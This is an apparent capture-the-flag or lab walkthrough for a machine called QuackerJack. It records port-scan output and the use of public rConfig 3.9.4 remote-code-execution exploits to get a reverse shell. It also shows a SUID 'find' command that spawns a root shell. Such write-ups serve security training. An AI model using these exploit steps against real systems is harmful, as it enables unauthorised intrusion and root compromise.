# QuackerJack

### Enumeration

```
...
8081/tcp open  ssl/http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
|_http-favicon: Unknown favicon MD5: 52D936993020A4A4BF686DB0EED64D5A
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=quackerjack/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Issuer: commonName=quackerjack/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-06-22T19:28:25
| Not valid after:  2021-06-22T19:28:25
| MD5:   ea49 5ac9 a64c f14d 0847 f4b8 2a3e 6ea0
|_SHA-1: 5e3b 3a09 9c75 6044 f1aa 168c 9592 8e56 e025 243f
|_ssl-date: TLS randomness does not represent time
...
```

There is a rConfig Version 3.9.4 on 8081.

**rConfig 3.9.4 - 'searchField' Unauthenticated Root Remote Code Execution - **

https://www.exploit-db.com/exploits/48261

```
python3 rconfig_root_RCE_unauth_final.py https://192.168.181.57:8081 192.168.49.181 443
[+] Adding a temporary admin user...
[+] Authenticating as ursjanvhgq...
Interrupted here. I could not work fully exploit.
```

### Initial Access

admin: ursjanvhgq

**Rconfig File Upload RCE Exploit - **

https://gist.github.com/farid007/9f6ad063645d5b1550298c8b9ae953ff

With this exploit, we can get reverse shell.

### PrivEsc

Find executable has a SUID bit.

[https://gtfobins.github.io/gtfobins/find/#suid](https://gtfobins.github.io/gtfobins/find/#suid)

```
-rwsr-xr-x. 1 root root 195K Oct 30  2018 /usr/bin/find

$ find . -exec /bin/bash -p \; -quit
```
